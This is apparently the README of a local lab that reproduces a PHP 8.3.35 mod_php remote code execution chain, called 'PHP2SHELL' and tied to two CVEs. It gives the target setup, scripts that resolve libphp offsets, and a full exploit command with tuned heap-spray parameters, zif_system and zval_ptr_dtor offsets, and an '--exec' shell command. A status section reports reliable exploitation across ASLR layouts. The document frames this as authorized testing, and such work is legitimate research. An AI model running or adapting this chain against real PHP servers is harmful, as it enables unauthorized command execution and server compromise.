# lab-8335 — PHP 8.3.35 mod_php proof

Local, authorized lab target for the last affected 8.3 release of the
PHP2SHELL engine-level chain (CVE-2026-109618/109619). `8.3.35` is inside
the advisory's vulnerable range (`8.3.* < 8.3.36`) and is the last affected
8.3 release before the 8.3.36 fix.

| Item | Value |
|---|---|
| Image | `php:8.3.35-apache` |
| OS / Apache | Debian, prefork, **one worker**, `KeepAlive Off` |
| PHP | 8.3.35 NTS, mod_php |
| ini | stock `php.ini-production` copied in by `run.sh` |
| Target page | `<?php echo "OK\n"; ?>` |
| Port | `127.0.0.1:18138` |
| Out channel | `./out` bind-mounted as `/out` |

## Usage

```
./calibrate.sh      # offsets -> target -> full-chain exec proof
```

Or step by step:

```
./offsets.sh        # libphp.so -> zif_system / zval_ptr_dtor
./run.sh            # start target on 127.0.0.1:18138
python3 ../oneshot/pure_shell.py --port 18138 \
  --zif 0x3ac080 --dtor 0x49ec50 \
  --a1-progress 1000 --b1-fake-len 0xC8000 \
  --b1-spec "$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")" \
  --b1-page-off 0x968 --s-mode dtor --dtor-anchor=-0x2000000 \
  --fake-array-delta 0xF9398 --exec 'id'
```

## Status

**Complete — SOLID.** Ten chain executions across six ASLR layouts; nine
were first-attempt successes, and the initial container absorbed one 0-byte
B1 with an immediate retry. The 8.3.29 heap geometry transferred unchanged;
only the symbol offsets moved (`zif_system +0x2C0`, `zval_ptr_dtor +0x1100`).
The result, parameters, and evidence manifest are in
[`RESULT.md`](RESULT.md). The 8.3.36 fixed release is handled by the
driver's patched-release gate; no dedicated fixed-build negative-control
lab is included.
